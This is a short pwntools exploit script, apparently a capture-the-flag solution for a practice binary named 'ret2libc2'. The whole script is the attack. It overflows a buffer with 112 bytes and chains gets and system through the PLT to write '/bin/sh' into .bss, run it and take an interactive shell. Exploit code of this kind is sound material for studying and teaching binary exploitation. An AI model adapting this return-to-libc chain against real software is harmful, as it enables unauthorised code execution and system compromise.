from pwn import *

sh = process('./ret2libc2')

bss_addr =0x0804A080
gets_plt = 0x08048460
sys_plt = 0x08048490

sh.recvuntil('What do you think ?')
payload = b'A'*112 + p32(gets_plt)+ p32(sys_plt)+ p32(bss_addr)+p32(bss_addr)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()